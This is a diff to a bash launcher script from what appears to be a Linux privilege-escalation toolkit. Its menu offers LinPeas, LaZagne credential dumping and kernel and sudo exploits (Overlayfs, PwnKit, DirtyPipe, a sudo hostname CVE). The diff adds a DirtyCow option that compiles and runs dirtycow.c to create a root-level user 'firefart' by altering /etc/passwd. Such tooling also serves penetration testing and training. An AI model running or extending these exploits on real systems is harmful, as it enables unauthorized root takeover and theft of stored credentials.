@@ -26,6 +26,7 @@ if [[ "$*" == "-help" ]]; then
     echo "   -LinPeas       Execute LinPeas"
     echo "   -LaZagne       Execute LaZagne"
     echo "   -Overlays      Compilation + execution binaire - CVE-2015-1328"
+    echo "   -DirtyCow      Compilation + execution binaire - CVE-2016-5195"
     echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
     echo "   -DirtyPipe     DirtyPipe - CVE-2022-0847"
     echo "   -SudoHost      Sudo Hostname - CVE-2025-32462"
@@ -70,6 +71,17 @@ if [[ "$*" == "-Overlays" ]]; then
      echo "[+] Executing the binary..."
      ${PWD}/exploit/Overlays/overlays
 
+fi
+
+# DirtyCow
+if [[ "$*" == "-DirtyCow" ]]; then
+     gcc -pthread ${PWD}/exploits/DirtyCow/dirtycow.c -o ${PWD}/exploits/DirtyCow/dcow -lcrypt
+     echo "[+] Compilation successfuly !"
+     echo "[+] PATH=${PWD}/exploits/DirtyCow/dcow"
+     echo "[+] Executing the binary..."
+     ${PWD}/exploits/DirtyCow/dcow test
+     echo "[+] User firefart created"
+     cat /etc/passwd | grep 'firefart'
 fi
 
 # Sudo-Host
